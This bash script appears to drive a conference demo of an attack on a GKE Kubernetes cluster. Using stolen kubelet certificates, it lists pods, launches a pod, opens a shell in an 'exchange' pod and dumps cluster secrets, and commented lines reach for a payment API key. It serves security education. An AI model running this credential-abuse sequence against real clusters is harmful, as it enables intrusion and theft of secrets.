#!/bin/bash

# $Id: $

set -o errexit
set -o pipefail

: ${PROJECT:="gcastle-gke-dev"}
: ${ZONE:="us-west1-b"}
: ${CLUSTER:="kubecon2018"}

DEMOMAGIC="demo-magic.sh"

if [ ! -f $DEMOMAGIC ]; then
  curl -OsS -L https://raw.githubusercontent.com/paxtonhare/demo-magic/master/demo-magic.sh 
fi

DEMO_PROMPT="attacker_machine$ "
. demo-magic.sh
RED="\033[0;91m"
clear
echo ""
echo ""

# Not sure this is worth demonstrating, cover in the slide.
#p "curl -X POST -H \"Content-Type: application/json\" -d '{\"access_token\":ya29.c...}' https://www.googleapis.com/oauth2/v2/tokeninfo"

# Print output to save token handling
#curl -X POST -H "Content-Type: application/json" -d '{"access_token":"ya29.c...}' https://www.googleapis.com/oauth2/v2/tokeninfo

#cat << EOF
#{
#  "issued_to": "112061657786725890568",
#  "audience": "112061657786725890568",
#  "scope": "https://www.googleapis.com/auth/trace.append https://www.googleapis.com/auth/service.management.readonly https://www.googleapis.com/auth/servicecontrol https://www.googleapis.com/auth/logging.write https://www.googleapis.com/auth/monitoring https://www.googleapis.com/auth/devstorage.read_only",
#  "expires_in": 2439,
#  "access_type": "offline"
#}
#EOF

# empty kubeconfig to make sure we're acting as the kubelet
export KUBECONFIG=$(mktemp /tmp/kubeconfig.XXXXXX)
p "${RED}kubectl --client-certificate ../kubelet_keys/client.crt \ "
DEMO_PROMPT="> "
p "${RED}--client-key ../kubelet_keys/client.pem \ "
p "${RED}--certificate-authority ../kubelet_keys/ca.crt \ "
p "${RED}get pods --all-namespaces${COLOR_RESET}"
DEMO_PROMPT="attacker_machine$ "
kubectl --client-certificate ../kubelet_keys/client.crt --client-key ../kubelet_keys/client.pem --certificate-authority ../kubelet_keys/ca.crt --server https://35.185.243.113 get pods --all-namespaces
p "${RED}kubectl run newnx --image=nginx${COLOR_RESET}"
kubectl --client-certificate ../kubelet_keys/client.crt --client-key ../kubelet_keys/client.pem --certificate-authority ../kubelet_keys/ca.crt --server https://35.185.243.113 run newnx --image=nginx || true
EXCHANGE=$(kubectl --client-certificate ../kubelet_keys/client.crt --client-key ../kubelet_keys/client.pem --certificate-authority ../kubelet_keys/ca.crt --server https://35.185.243.113 get pods -n exchange --selector=app=exchange --output=jsonpath={.items..metadata.name})
p "${RED}kubectl exec -it ${EXCHANGE} -- /bin/bash${COLOR_RESET}"
kubectl --client-certificate ../kubelet_keys/client.crt --client-key \
../kubelet_keys/client.pem --certificate-authority ../kubelet_keys/ca.crt \
--server https://35.185.243.113 -n exchange exec -it ${EXCHANGE} -- /bin/bash || true
p "${RED}kubectl get secrets${COLOR_RESET}"
kubectl --client-certificate ../kubelet_keys/client.crt --client-key ../kubelet_keys/client.pem --certificate-authority ../kubelet_keys/ca.crt --server https://35.185.243.113 get secrets
#p "kubectl get payment-api-key"
#kubectl --client-certificate ../kubelet_keys/client.crt --client-key ../kubelet_keys/client.pem --certificate-authority ../kubelet_keys/ca.crt --server https://35.185.243.113 get secret payment-api-key


#p "kubectl auth can-i create certificatesigningrequests"
#kubectl --client-certificate ../kubelet_keys/client.crt --client-key ../kubelet_keys/client.pem --certificate-authority ../kubelet_keys/ca.crt --server https://35.185.243.113 auth can-i create certificatesigningrequests

echo ""
echo ""
echo ""
p "${CYAN}# Back to slides"

